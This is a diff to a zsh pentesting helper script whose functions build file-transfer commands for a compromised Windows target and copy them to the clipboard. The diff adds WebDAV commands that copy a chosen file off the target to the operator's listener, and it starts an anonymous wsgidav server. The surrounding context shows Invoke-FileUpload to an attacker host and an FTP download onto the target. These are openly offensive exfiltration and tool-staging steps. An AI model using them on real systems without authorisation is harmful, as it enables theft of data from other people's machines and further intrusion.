@@ -144,7 +144,6 @@ nb-srv-uploadserver-upload() {
   __COMMAND2=Invoke-FileUpload -Uri http://${__LHOST}:${__LPORT}/upload -File $path
   echo "$__COMMAND2" | wl-copy
   echo "$__COMMAND1" | wl-copy
-
   __info "2 Commands to use on a target system copied to clipboard"
 }
 
@@ -159,7 +158,6 @@ nb-srv-ftp-down() {
   echo
   __COMMAND="(New-Object Net.WebClient).DownloadFile('ftp://${__LHOST}/$filename', 'C:\Users\Public\\$filename')"
   echo "$__COMMAND" | wl-copy
-
   __info "Command to use on a target system copied to clipboard"
 }
 
@@ -174,13 +172,21 @@ nb-srv-smb-down() {
   echo
   __COMMAND="copy \\${__LHOST}\share\\$filename"
   echo "$__COMMAND" | wl-copy
-
   __info "Command to use on a target system copied to clipboard"
 }
 
 nb-srv-smb-http() {
   nb-vars-set-lhost
-   print -z "sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous"
+  local path && __askvar path "FULL_PATH_TO_FILE"
+
+  echo
+  __COMMAND1="dir \\${__LHOST}\DavWWWRoot"
+  __COMMAND2="copy $path \\${__LHOST}\DavWWWRoot"
+  echo $__COMMAND2 | wl-copy
+  echo $__COMMAND1 | wl-copy
+  __info "2 Commands to use on a target system copied to clipboard"
+
+  print -z "sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous"
 }
 
 # New versions of Windows block unauthenticated guest access, to bypass set username and pass
@@ -197,7 +203,6 @@ nb-srv-smb-auth-down() {
   __COMMAND2="copy n:\\$filename"
   echo "$__COMMAND2" | wl-copy
   echo "$__COMMAND1" | wl-copy
-
   __info "2 Commands to use on a target system copied to clipboard"
 }
 
